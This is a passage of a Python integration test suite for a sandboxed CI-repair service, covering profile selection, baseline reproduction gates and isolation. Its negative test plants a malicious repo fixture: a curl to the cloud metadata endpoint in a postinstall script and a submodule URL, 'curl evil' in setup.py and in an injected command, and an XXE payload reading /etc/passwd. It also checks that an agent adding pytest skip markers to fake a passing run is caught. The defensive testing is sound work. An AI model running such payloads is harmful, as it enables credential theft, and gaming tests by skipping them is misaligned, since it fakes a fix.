                    ts_src = (wt / "src" / "slug.ts").read_text(encoding="utf-8")
                    if ".toLowerCase()" in ts_src:
                        out = b" \xe2\x9c\x93 src/slug.spec.ts (2)\n Tests  2 passed (2)\n"
                        return (0, out, b"", None, False)
                    out = (
                        b"FAIL src/slug.spec.ts\n"
                        b"\xc3\x97 normalizes uppercase slug\n"
                        b"AssertionError: expected 'Hello-World' to be 'hello-world'\n"
                        b" Tests  1 failed | 1 passed (2)\n"
                    )
                    return (1, out, b"", None, False)

                # custom-linux-declared
                sh_src = (wt / "src" / "rule.txt").read_text(encoding="utf-8")
                if "FIXED=1" in sh_src:
                    return (0, b"=== 2 passed in 0.02s ===\n", b"", None, False)
                return (
                    1,
                    (
                        b"FAILED tests/test_custom.py::test_rule - AssertionError: broken\n"
                        b"=== 1 failed, 1 passed in 0.02s ===\n"
                    ),
                    b"",
                    None,
                    False,
                )

            driver = _ContentEvaluatingSandboxDriver(
                _vm_attestation("vm-u15-01.internal"),
                evaluator=_eval_worktree,
            )
            dep_cache = TenantDependencyCacheManager(tmp_path / "dep_cache_root")
            supervisor = WorkerSupervisor(
                credentials=creds,
                signer=signer,
                driver=driver,
                scratch_dir=tmp_path / "guest_scratch",
                state_dir=tmp_path / "supervisor_state",
                supported_profiles=supported_profiles,
                heartbeat_interval_seconds=0.25,
                dep_cache_manager=dep_cache,
            )
            materializer = SourceArchiveMaterializer()

            async with _build_mtls_worker_client(creds, base_url=strict_mtls_url) as mtls_cli:
                # --------------------------------------------------------------
                # Case 1: `python-pytest-linux` (`F3_VALIDATED` + `:ro` dep-cache)
                # --------------------------------------------------------------
                py_repo = tmp_path / "src_py"
                (py_repo / ".git" / "hooks").mkdir(parents=True)
                (py_repo / ".git" / "hooks" / "post-checkout").write_text("evil", encoding="utf-8")
                (py_repo / ".env").write_text("SECRET_KEY=do_not_stage\n", encoding="utf-8")
                (py_repo / "pyproject.toml").write_text(
                    "[project]\nname='calc'\n", encoding="utf-8"
                )
                (py_repo / "uv.lock").write_text("version = 1\n", encoding="utf-8")
                (py_repo / "src").mkdir()
                (py_repo / "src" / "calc.py").write_text(
                    "def add(a: int, b: int) -> int:\n    return a - b\n",
                    encoding="utf-8",
                    newline="\n",
                )
                py_sha = "11" * 20
                py_snap = materializer.materialize_directory(py_repo, base_sha=py_sha)

                # Populate verified `:ro` dependency cache for `(ws_id, python-pytest-linux, lock)`
                dep_cache.populate_cache_entry(
                    workspace_id=ws_id,
                    profile_id="python-pytest-linux",
                    dependency_lock_digest=py_snap.dependency_lock_digest,
                    files={"wheels/pytest-8.4.2.whl": b"verified_wheel"},
                )

                py_sel = select_profile_for_ci_job(
                    ci_job_name="pytest (3.12, linux)",
                    repo_files=py_snap.repo_indicator_files,
                )
                assert py_sel.supported is True
                assert py_sel.profile_id == "python-pytest-linux"
                assert py_sel.fidelity_grade == "F3_VALIDATED"

                py_run_id, py_job_id, _ = await _seed_ci_run_and_failed_job(
                    harness.app_factory,
                    workspace_id=ws_id,
                    repository_id=repo_id,
                    head_sha=py_sha,
                    job_name="pytest (3.12, linux)",
                    ci_failure_log=(
                        "FAILED tests/test_calc.py::test_add - AssertionError: expected 5 got -1\n"
                    ),
                    now=clock(),
                )
                py_repair_id = new_uuid7(now=clock())

                py_base_running = await harness.reproducer.start_baseline_sandbox_a(
                    workspace_id=ws_id,
                    repository_id=repo_id,
                    repair_id=py_repair_id,
                    ci_run_id=py_run_id,
                    ci_job_id=py_job_id,
                    base_sha=py_sha,
                    source_archive_bytes=py_snap.archive_bytes,
                    selection=py_sel,
                    dependency_lock_digest=py_snap.dependency_lock_digest,
                    correlation_id="corr-u15-py-a",
                    now=clock(),
                )
                assert py_base_running.status == "running"
                assert py_base_running.cache_key == (
                    f"{ws_id}:python-pytest-linux:{py_snap.dependency_lock_digest}"
                )

                cyc_py_a = await supervisor.poll_and_execute_once(mtls_cli, now_fn=clock)
                assert cyc_py_a is not None and cyc_py_a.disposition == "completed"
                assert any(
                    m.endswith(":/dep-cache:ro,noexec,nosuid,nodev,Z")
                    for m in driver.executions[-1].mounts
                )

                py_base_done = await harness.reproducer.finalize_baseline_sandbox_a(
                    workspace_id=ws_id,
                    reproduction_id=py_base_running.id,
                    correlation_id="corr-u15-py-a",
                    now=clock(),
                )
                assert py_base_done.status == "repro_confirmed"
                assert py_base_done.allow_patching is True
                assert py_base_done.fingerprint_matched is True
                assert py_base_done.executed_tests_count == 3
                assert py_base_done.failed_tests_count == 1
                assert py_base_done.handoff_outcome == "proceed_to_patch"

                # ADR-031 gate succeeds for confirmed baseline:
                gated = await harness.reproducer.enforce_adr031_baseline_gate(
                    workspace_id=ws_id,
                    repair_id=py_repair_id,
                    correlation_id="corr-u15-py-gate",
                    now=clock(),
                )
                assert gated.id == py_base_done.id

                py_diff = (
                    "--- a/src/calc.py\n"
                    "+++ b/src/calc.py\n"
                    "@@ -1,2 +1,2 @@\n"
                    " def add(a: int, b: int) -> int:\n"
                    "-    return a - b\n"
                    "+    return a + b\n"
                )
                py_b_running = await harness.reproducer.start_patched_sandbox_b(
                    workspace_id=ws_id,
                    repair_id=py_repair_id,
                    baseline_reproduction_id=py_base_done.id,
                    patch_diff_text=py_diff,
                    correlation_id="corr-u15-py-b",
                    now=clock(),
                )
                assert py_b_running.sandbox_job_id != py_base_done.sandbox_job_id

                cyc_py_b = await supervisor.poll_and_execute_once(mtls_cli, now_fn=clock)
                assert cyc_py_b is not None and cyc_py_b.disposition == "completed"
                # Sandbox B ran in a brand-new ephemeral worktree directory!
                assert driver.executions[-1].worktree_dir != driver.executions[-2].worktree_dir

                py_b_done = await harness.reproducer.finalize_patched_sandbox_b(
                    workspace_id=ws_id,
                    reproduction_id=py_b_running.id,
                    correlation_id="corr-u15-py-b",
                    now=clock(),
                )
                assert py_b_done.status == "patched_passed"
                assert py_b_done.allow_publication is True
                assert py_b_done.handoff_outcome == "verified_red_to_green"
                assert py_b_done.executed_tests_count == 3
                assert py_b_done.failed_tests_count == 0
                assert py_b_done.command_digest == py_base_done.command_digest
                assert py_b_done.environment_digest == py_base_done.environment_digest

                # --------------------------------------------------------------
                # Case 2: `node-jest-linux` (`F2_APPROX` — opaque CI action note)
                # --------------------------------------------------------------
                jest_repo = tmp_path / "src_jest"
                jest_repo.mkdir()
                (jest_repo / "package.json").write_text('{"name":"shop"}\n', encoding="utf-8")
                (jest_repo / "package-lock.json").write_text(
                    '{"lockfileVersion":3}\n', encoding="utf-8"
                )
                (jest_repo / "jest.config.js").write_text(
                    "module.exports = {};\n", encoding="utf-8"
                )
                (jest_repo / "src").mkdir()
                (jest_repo / "src" / "discount.js").write_text(
                    "exports.apply = (price, pct) => price * (1 + pct);\n",
                    encoding="utf-8",
                    newline="\n",
                )
                jest_sha = "22" * 20
                jest_snap = materializer.materialize_directory(jest_repo, base_sha=jest_sha)
                jest_sel = select_profile_for_ci_job(
                    ci_job_name="unit-jest",
                    repo_files=jest_snap.repo_indicator_files,
                    has_opaque_ci_actions=True,
                )
                assert jest_sel.profile_id == "node-jest-linux"
                assert jest_sel.fidelity_grade == "F2_APPROX"
                assert "opaque_ci_vendor_actions_not_replayed" in jest_sel.fidelity_differences

                j_run_id, j_job_id, _ = await _seed_ci_run_and_failed_job(
                    harness.app_factory,
                    workspace_id=ws_id,
                    repository_id=repo_id,
                    head_sha=jest_sha,
                    job_name="unit-jest",
                    ci_failure_log=(
                        "FAIL src/discount.test.js\n"
                        "\u00d7 applies percentage discount\n"
                        "Error: expect(received).toBe(expected)\n"
                    ),
                    now=clock(),
                )
                j_repair_id = new_uuid7(now=clock())
                j_a = await harness.reproducer.start_baseline_sandbox_a(
                    workspace_id=ws_id,
                    repository_id=repo_id,
                    repair_id=j_repair_id,
                    ci_run_id=j_run_id,
                    ci_job_id=j_job_id,
                    base_sha=jest_sha,
                    source_archive_bytes=jest_snap.archive_bytes,
                    selection=jest_sel,
                    dependency_lock_digest=jest_snap.dependency_lock_digest,
                    correlation_id="corr-u15-jest-a",
                    now=clock(),
                )
                await supervisor.poll_and_execute_once(mtls_cli, now_fn=clock)
                # Lock digest differs from Python repo -> zero cross-profile cache mount!
                assert not any("/dep-cache" in m for m in driver.executions[-1].mounts)
                j_a_done = await harness.reproducer.finalize_baseline_sandbox_a(
                    workspace_id=ws_id,
                    reproduction_id=j_a.id,
                    correlation_id="corr-u15-jest-a",
                    now=clock(),
                )
                assert j_a_done.status == "repro_confirmed"

                jest_diff = (
                    "--- a/src/discount.js\n"
                    "+++ b/src/discount.js\n"
                    "@@ -1 +1 @@\n"
                    "-exports.apply = (price, pct) => price * (1 + pct);\n"
                    "+exports.apply = (price, pct) => price * (1 - pct);\n"
                )
                j_b = await harness.reproducer.start_patched_sandbox_b(
                    workspace_id=ws_id,
                    repair_id=j_repair_id,
                    baseline_reproduction_id=j_a_done.id,
                    patch_diff_text=jest_diff,
                    correlation_id="corr-u15-jest-b",
                    now=clock(),
                )
                await supervisor.poll_and_execute_once(mtls_cli, now_fn=clock)
                j_b_done = await harness.reproducer.finalize_patched_sandbox_b(
                    workspace_id=ws_id,
                    reproduction_id=j_b.id,
                    correlation_id="corr-u15-jest-b",
                    now=clock(),
                )
                assert j_b_done.status == "patched_passed"
                assert j_b_done.fidelity_grade == "F2_APPROX"
                assert j_b_done.allow_publication is True

                # --------------------------------------------------------------
                # Case 3: `node-vitest-linux` (`F1_TARGETED` — unpinned + targeted)
                # --------------------------------------------------------------
                vt_repo = tmp_path / "src_vitest"
                vt_repo.mkdir()
                (vt_repo / "package.json").write_text('{"name":"slugger"}\n', encoding="utf-8")
                (vt_repo / "vitest.config.ts").write_text("export default {};\n", encoding="utf-8")
                (vt_repo / "src").mkdir()
                (vt_repo / "src" / "slug.ts").write_text(
                    "export const slug = (s: string) => s.trim();\n",
                    encoding="utf-8",
                    newline="\n",
                )
                vt_sha = "33" * 20
                vt_snap = materializer.materialize_directory(vt_repo, base_sha=vt_sha)
                vt_sel = select_profile_for_ci_job(
                    ci_job_name="vitest-unit",
                    repo_files=vt_snap.repo_indicator_files,
                    targeted_only=True,
                )
                assert vt_sel.profile_id == "node-vitest-linux"
                assert vt_sel.fidelity_grade == "F1_TARGETED"
                assert "dependency_lockfile_unpinned" in vt_sel.fidelity_differences
                assert "targeted_test_subset_only" in vt_sel.fidelity_differences

                v_run_id, v_job_id, _ = await _seed_ci_run_and_failed_job(
                    harness.app_factory,
                    workspace_id=ws_id,
                    repository_id=repo_id,
                    head_sha=vt_sha,
                    job_name="vitest-unit",
                    ci_failure_log=(
                        "FAIL src/slug.spec.ts\n"
                        "\u00d7 normalizes uppercase slug\n"
                        "AssertionError: expected 'Hello-World' to be 'hello-world'\n"
                    ),
                    now=clock(),
                )
                v_repair_id = new_uuid7(now=clock())
                v_a = await harness.reproducer.start_baseline_sandbox_a(
                    workspace_id=ws_id,
                    repository_id=repo_id,
                    repair_id=v_repair_id,
                    ci_run_id=v_run_id,
                    ci_job_id=v_job_id,
                    base_sha=vt_sha,
                    source_archive_bytes=vt_snap.archive_bytes,
                    selection=vt_sel,
                    correlation_id="corr-u15-vt-a",
                    now=clock(),
                )
                await supervisor.poll_and_execute_once(mtls_cli, now_fn=clock)
                v_a_done = await harness.reproducer.finalize_baseline_sandbox_a(
                    workspace_id=ws_id,
                    reproduction_id=v_a.id,
                    correlation_id="corr-u15-vt-a",
                    now=clock(),
                )
                assert v_a_done.status == "repro_confirmed"

                vt_diff = (
                    "--- a/src/slug.ts\n"
                    "+++ b/src/slug.ts\n"
                    "@@ -1 +1 @@\n"
                    "-export const slug = (s: string) => s.trim();\n"
                    "+export const slug = (s: string) => s.trim().toLowerCase();\n"
                )
                v_b = await harness.reproducer.start_patched_sandbox_b(
                    workspace_id=ws_id,
                    repair_id=v_repair_id,
                    baseline_reproduction_id=v_a_done.id,
                    patch_diff_text=vt_diff,
                    correlation_id="corr-u15-vt-b",
                    now=clock(),
                )
                await supervisor.poll_and_execute_once(mtls_cli, now_fn=clock)
                v_b_done = await harness.reproducer.finalize_patched_sandbox_b(
                    workspace_id=ws_id,
                    reproduction_id=v_b.id,
                    correlation_id="corr-u15-vt-b",
                    now=clock(),
                )
                assert v_b_done.status == "patched_passed"
                assert v_b_done.fidelity_grade == "F1_TARGETED"
                assert v_b_done.allow_publication is True

                # --------------------------------------------------------------
                # Case 4: Admin-opted `custom-linux-declared` (`vm_isolated`)
                # --------------------------------------------------------------
                custom_sel = select_profile_for_ci_job(
                    ci_job_name="declared-custom-suite",
                    repo_files=["uv.lock"],
                    policy_runtime_profile_id="custom-linux-declared",
                    custom_profile_admin_opt_in=True,
                )
                assert custom_sel.supported is True
                assert custom_sel.profile_id == "custom-linux-declared"
                assert custom_sel.requires_vm_isolation is True
                assert custom_sel.fidelity_grade == "F2_APPROX"

        await owner_cli.aclose()
    finally:
        await harness.app_engine.dispose()


async def test_adr031_negative_gates_unsupported_abstain_skip_regression_and_malicious_hooks(
    migrated_db: PgTestUrls,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """`T-SAN-02-N`, `T-SAN-03-N`, `ADR-018`, `ADR-031`, `SEC-006`, `SEC-024`, `SEC-026`, `SEC-036`:
    Verify unsupported abstention (`0` jobs), all 5 `repro_unconfirmed` traps blocking patching,
    skip-inflation rejection in Sandbox B, malicious lifecycle hook containment, and audit chain."""
    clock = ManualClock(datetime.now(tz=UTC) - timedelta(minutes=45))
    harness = _build_u15_harness(migrated_db.app_url, clock=clock, store_dir=tmp_path / "artifacts")
    try:
        owner_cli, csrf, ws_id, repo_id = await _claim_owner_and_seed_repo(
            harness,
            now=clock(),
            ws_slug="ws-neg-15",
            ws_name="Neg 15",
        )

        # 1. Unreviewed command/profile injection is rejected fail-closed (`SEC-006`):
        reg = RunnerProfileRegistry()
        with pytest.raises(UnprocessableEntityError) as exc_cmd:
            reg.resolve_profile_and_commands("python-pytest-linux", ["bash -c 'curl evil'"])
        assert exc_cmd.value.code == "unreviewed_profile_or_command"

        # 2. JUnit XML DTD/XXE declaration rejected (`SEC-026`):
        with pytest.raises(BadRequestError) as exc_xml:
            parse_test_execution_output(
                stdout_text="",
                junit_xml_text=(
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                    '<testsuite tests="1"/>'
                ),
            )
        assert exc_xml.value.code == "unsafe_junit_xml_dtd"

        # 3. Unsupported CI jobs abstain explicitly (`FX_UNSUPPORTED`, `0` sandbox jobs dispatched):
        unsupported_cases = [
            ("build-and-test (macos-15)", {}, (), None, False, "unsupported_non_linux_runner"),
            (
                "cuda-train-tests",
                {"gpu": "nvidia-a100"},
                (),
                None,
                False,
                "unsupported_gpu_accelerator",
            ),
            (
                "integration-dind",
                {},
                ("docker:dind",),
                None,
                False,
                "unsupported_privileged_or_dind",
            ),
            (
                "prod-db-check",
                {},
                ("undeclared_secret_service",),
                None,
                False,
                "unsupported_secret_backed_service",
            ),
            (
                "custom-no-optin",
                {},
                (),
                "custom-linux-declared",
                False,
                "custom_profile_opt_in_required",
            ),
            ("cargo test --workspace", {}, (), None, False, "no_matching_certified_profile"),
        ]
        unsup_sha = "44" * 20
        u_run_id, u_job_id, _ = await _seed_ci_run_and_failed_job(
            harness.app_factory,
            workspace_id=ws_id,
            repository_id=repo_id,
            head_sha=unsup_sha,
            job_name="macos-15-tests",
            ci_failure_log="FAILED tests/test_mac.py::test_ui - AssertionError: failed\n",
            now=clock(),
        )
        for j_name, mat, caps, pol_prof, opt_in, expected_reason in unsupported_cases:
            sel = select_profile_for_ci_job(
                ci_job_name=j_name,
                matrix_dimensions=mat,
                declared_capabilities=caps,
                policy_runtime_profile_id=pol_prof,
                custom_profile_admin_opt_in=opt_in,
                repo_files=["pyproject.toml"],
            )
            assert sel.supported is False
            assert sel.fidelity_grade == "FX_UNSUPPORTED"
            assert sel.reason_code == expected_reason

            rep_id = new_uuid7(now=clock())
            rec = await harness.reproducer.record_unsupported_reproduction(
                workspace_id=ws_id,
                repository_id=repo_id,
                repair_id=rep_id,
                ci_run_id=u_run_id,
                ci_job_id=u_job_id,
                base_sha=unsup_sha,
                selection=sel,
                correlation_id=f"corr-unsup-{expected_reason[:20]}",
                now=clock(),
            )
            assert rec.status == "unsupported"
            assert rec.fidelity_grade == "FX_UNSUPPORTED"
            assert rec.handoff_outcome == "unsupported_abstain"
            assert rec.allow_patching is False
            assert rec.sandbox_job_id is None

            with pytest.raises(ConflictError) as gate_err:
                await harness.reproducer.enforce_adr031_baseline_gate(
                    workspace_id=ws_id,
                    repair_id=rep_id,
                    correlation_id="corr-unsup-gate",
                    now=clock(),
                )
            assert gate_err.value.code == "adr031_unconfirmed_baseline"

        # Verify ZERO TaskJobs or SandboxLeases were created for all unsupported jobs!
        async with workspace_rls_session(harness.app_factory, workspace_id=ws_id) as db:
            assert (await db.scalar(select(func.count()).select_from(TaskJobModel))) == 0
            assert (await db.scalar(select(func.count()).select_from(SandboxLeaseModel))) == 0

        # 4. Enroll worker over TLS 1.3 and run negative `repro_unconfirmed` + hook/skip cases:
        enroll_resp = await owner_cli.post(
            "/api/v1/system/workers/enrollments",
            headers=_csrf_headers(csrf),
            json={
                "trust_domain": "worker-supervisor",
                "profile_ids": ["python-pytest-linux", "node-jest-linux"],
                "isolation_mode": "vm_isolated",
                "ttl_minutes": 30,
            },
        )
        assert enroll_resp.status_code == 201
        raw_token = str(enroll_resp.json()["enrollment_token"])
        ca_cert_pem = str(enroll_resp.json()["ca_cert_pem"])

        # Set a host secret canary in os.environ to prove it NEVER leaks into guest_env (`SEC-006`):
        monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY")

        mode_box: dict[str, str] = {"scenario": "zero_tests"}

        def _neg_eval(
            job: SandboxJobV1,
            inv: HardenedOciInvocation,
            wt: Path,
        ) -> tuple[int, bytes, bytes, bytes | None, bool]:
            _ = job
            assert "AWS_SECRET_ACCESS_KEY" not in inv.guest_env
            assert not (wt / ".git").exists()
            scenario = mode_box["scenario"]
            if scenario == "zero_tests":
                # `--passWithNoTests` trap: exit 0 with 0 executed tests!
                return (
                    0,
                    b"No tests found, exiting with code 0\nTests: 0 total\n",
                    b"",
                    None,
                    False,
                )
            if scenario == "passing_baseline":
                return (0, b"=== 2 passed in 0.03s ===\n", b"", None, False)
            if scenario == "timeout":
                return (124, b"hang...", b"", None, True)
            if scenario == "bootstrap_install_error":
                return (
                    1,
                    b"",
                    (
                        b"PIP_INSTALL_ERROR: Could not find a version "
                        b"that satisfies the requirement foo==99.9\n"
                    ),
                    None,
                    False,
                )
            if scenario == "unrelated_fingerprint":
                return (
                    1,
                    (
                        b"FAILED tests/test_unrelated.py::test_other - ValueError: wrong crash\n"
                        b"=== 1 failed in 0.02s ===\n"
                    ),
                    b"",
                    None,
                    False,
                )
            if scenario == "confirm_for_skip_test":
                return (
                    1,
                    (
                        b"FAILED tests/test_auth.py::test_token_ttl - AssertionError: expired\n"
                        b"=== 1 failed, 2 passed in 0.04s ===\n"
                    ),
                    b"",
                    None,
                    False,
                )
            # scenario == "skip_regression_in_sandbox_b": agent cheated by adding @pytest.mark.skip!
            return (
                0,
                b"=== 2 passed, 1 skipped in 0.03s ===\n",
                b"",
                None,
                False,
            )

        server_tls = await harness.worker_broker.ca.issue_server_bundle(now=clock())
        async with (
            _start_loopback_tls13_server(
                harness.api_app,
                server_tls,
                cert_reqs=ssl.CERT_OPTIONAL,
            ) as bootstrap_url,
            _start_loopback_tls13_server(
                harness.api_app,
                server_tls,
                cert_reqs=ssl.CERT_REQUIRED,
            ) as strict_mtls_url,
        ):
            signer = ExternalResultSigner.generate(key_id="ed25519-u15-neg-01", not_before=clock())
            async with _build_bootstrap_tls_client(ca_cert_pem, base_url=bootstrap_url) as boot_cli:
                creds = await WorkerEnroller().enroll(
                    client=boot_cli,
                    enrollment_token=raw_token,
                    supported_profiles=["python-pytest-linux", "node-jest-linux"],
                    signer=signer,
                    attestation=_vm_attestation("vm-u15-neg.internal"),
                    now=clock(),
                )

            driver = _ContentEvaluatingSandboxDriver(
                _vm_attestation("vm-u15-neg.internal"),
                evaluator=_neg_eval,
            )
            supervisor = WorkerSupervisor(
                credentials=creds,
                signer=signer,
                driver=driver,
                scratch_dir=tmp_path / "neg_scratch",
                state_dir=tmp_path / "neg_state",
                supported_profiles=["python-pytest-linux", "node-jest-linux"],
                heartbeat_interval_seconds=0.25,
            )

            # Build malicious repo (`postinstall`, `setup.py`, `.git/hooks`, `169.254.169.254`):
            mal_dir = tmp_path / "malicious_repo"
            (mal_dir / ".git" / "hooks").mkdir(parents=True)
            (mal_dir / ".git" / "hooks" / "post-checkout").write_text(
                "#!/bin/sh\nid\n", encoding="utf-8"
            )
            (mal_dir / ".gitmodules").write_text(
                '[submodule "ssrf"]\npath = sub\nurl = http://169.254.169.254/latest/meta-data\n',
                encoding="utf-8",
            )
            (mal_dir / "package.json").write_text(
                json.dumps(
                    {
                        "name": "evil-pkg",
                        "scripts": {"postinstall": "curl http://169.254.169.254/steal"},
                    }
                ),
                encoding="utf-8",
            )
            (mal_dir / "setup.py").write_text(
                "import os; os.system('curl evil')\n", encoding="utf-8"
            )
            (mal_dir / "pyproject.toml").write_text("[project]\nname='app'\n", encoding="utf-8")
            (mal_dir / "uv.lock").write_text("version = 1\n", encoding="utf-8")
            (mal_dir / "src").mkdir()
            (mal_dir / "src" / "auth.py").write_text("TTL = -1\n", encoding="utf-8", newline="\n")

            neg_sha = "55" * 20
            mal_snap = SourceArchiveMaterializer().materialize_directory(mal_dir, base_sha=neg_sha)
            assert len(mal_snap.stripped_git_paths) >= 1
            assert len(mal_snap.blocked_submodules) == 1
            assert len(mal_snap.detected_lifecycle_hooks) >= 2

            n_run_id, n_job_id, _ = await _seed_ci_run_and_failed_job(
                harness.app_factory,
                workspace_id=ws_id,
                repository_id=repo_id,
                head_sha=neg_sha,
                job_name="pytest-auth",
                ci_failure_log=(
                    "FAILED tests/test_auth.py::test_token_ttl - AssertionError: expired\n"
                ),
                now=clock(),
            )
            py_sel = select_profile_for_ci_job(
                ci_job_name="pytest-auth",
                repo_files=["pyproject.toml", "uv.lock"],
            )
            jest_sel = select_profile_for_ci_job(
                ci_job_name="jest-suite",
                repo_files=["package.json", "jest.config.js"],
            )

            unconfirmed_matrix = [
                ("zero_tests", jest_sel, "zero_tests_executed"),
                ("passing_baseline", py_sel, "baseline_passed_unexpectedly"),
                ("timeout", py_sel, "baseline_timeout"),
                ("bootstrap_install_error", py_sel, "baseline_bootstrap_or_install_error"),
                ("unrelated_fingerprint", py_sel, "unrelated_failure_fingerprint"),
            ]

            async with _build_mtls_worker_client(creds, base_url=strict_mtls_url) as mtls_cli:
                for scenario_key, sel_choice, expected_reason in unconfirmed_matrix:
                    mode_box["scenario"] = scenario_key
                    rep_id = new_uuid7(now=clock())
                    run_a = await harness.reproducer.start_baseline_sandbox_a(
                        workspace_id=ws_id,
                        repository_id=repo_id,
                        repair_id=rep_id,
                        ci_run_id=n_run_id,
                        ci_job_id=n_job_id,
                        base_sha=neg_sha,
                        source_archive_bytes=mal_snap.archive_bytes,
                        selection=sel_choice,
                        correlation_id=f"corr-neg-{scenario_key}",
                        now=clock(),
                    )
                    await supervisor.poll_and_execute_once(mtls_cli, now_fn=clock)
                    sealed_a = await harness.reproducer.finalize_baseline_sandbox_a(
                        workspace_id=ws_id,
                        reproduction_id=run_a.id,
                        correlation_id=f"corr-neg-{scenario_key}",
                        now=clock(),
                    )
                    assert sealed_a.status == "repro_unconfirmed"
                    assert sealed_a.failure_reason_code == expected_reason
                    assert sealed_a.handoff_outcome == "diagnosis_and_human_handoff"
                    assert sealed_a.allow_patching is False
                    assert sealed_a.allow_publication is False
                    assert sealed_a.immutable_sealed is True

                    # ADR-031 gate MUST block patch generation and Sandbox B (`0` patches/PRs):
                    with pytest.raises(ConflictError) as g1:
                        await harness.reproducer.enforce_adr031_baseline_gate(
                            workspace_id=ws_id,
                            repair_id=rep_id,
                            correlation_id=f"corr-gate-{scenario_key}",
                            now=clock(),
                        )
                    assert g1.value.code == "adr031_unconfirmed_baseline"

                    with pytest.raises(ConflictError) as g2:
                        await harness.reproducer.start_patched_sandbox_b(
                            workspace_id=ws_id,
                            repair_id=rep_id,
                            baseline_reproduction_id=sealed_a.id,
                            patch_diff_text=(
                                "--- a/src/auth.py\n"
                                "+++ b/src/auth.py\n"
                                "@@ -1 +1 @@\n"
                                "-TTL = -1\n"
                                "+TTL = 60\n"
                            ),
                            correlation_id=f"corr-sbxb-{scenario_key}",
                            now=clock(),
                        )
                    assert g2.value.code == "adr031_unconfirmed_baseline"

                # 5. Skip-inflation / test-count drop in Sandbox B MUST fail (`doc10:48`):
                mode_box["scenario"] = "confirm_for_skip_test"
                skip_rep_id = new_uuid7(now=clock())
                ok_a = await harness.reproducer.start_baseline_sandbox_a(
                    workspace_id=ws_id,
                    repository_id=repo_id,
                    repair_id=skip_rep_id,
                    ci_run_id=n_run_id,
                    ci_job_id=n_job_id,
                    base_sha=neg_sha,
                    source_archive_bytes=mal_snap.archive_bytes,
                    selection=py_sel,
                    correlation_id="corr-skip-a",
                    now=clock(),
                )
                await supervisor.poll_and_execute_once(mtls_cli, now_fn=clock)
                ok_a_done = await harness.reproducer.finalize_baseline_sandbox_a(
                    workspace_id=ws_id,
                    reproduction_id=ok_a.id,
                    correlation_id="corr-skip-a",
                    now=clock(),
                )
                assert ok_a_done.status == "repro_confirmed"
                assert ok_a_done.executed_tests_count == 3
                assert ok_a_done.skipped_tests_count == 0

                mode_box["scenario"] = "skip_regression_in_sandbox_b"
                cheat_b = await harness.reproducer.start_patched_sandbox_b(
                    workspace_id=ws_id,
                    repair_id=skip_rep_id,
                    baseline_reproduction_id=ok_a_done.id,
                    patch_diff_text=(
                        "--- a/src/auth.py\n+++ b/src/auth.py\n@@ -1 +1 @@\n-TTL = -1\n+TTL = 0\n"
                    ),
                    correlation_id="corr-skip-b",
                    now=clock(),
                )
                await supervisor.poll_and_execute_once(mtls_cli, now_fn=clock)
                cheat_b_done = await harness.reproducer.finalize_patched_sandbox_b(
                    workspace_id=ws_id,
                    reproduction_id=cheat_b.id,
                    correlation_id="corr-skip-b",
                    now=clock(),
                )
                assert cheat_b_done.status == "patched_failed"
                assert cheat_b_done.failure_reason_code == "test_count_or_skip_regression"
                assert cheat_b_done.allow_publication is False
                assert cheat_b_done.handoff_outcome == "patch_still_failing"

        # 6. Verify outbox events & tamper-evident audit hash chains (`SEC-024`):
        async with workspace_rls_session(harness.app_factory, workspace_id=ws_id) as db:
            evt_types = set((await db.scalars(select(OutboxEventModel.event_type))).all())
            assert {
                "repair.reproduction.completed",
                "repair.diagnosed",
                "repair.blocked",
                "repair.verification.completed",
            }.issubset(evt_types)

        async with instance_rls_session(harness.app_factory, mode="audit_verifier") as aud_db:
            verified_entries = await verify_audit_chain(
                aud_db,
                external_store=ExternalCheckpointStore(tmp_path / "audit_ckpts"),
                keyring=KeyRing(()),
            )
            assert verified_entries >= 15

        await owner_cli.aclose()
    finally:
        await harness.app_engine.dispose()
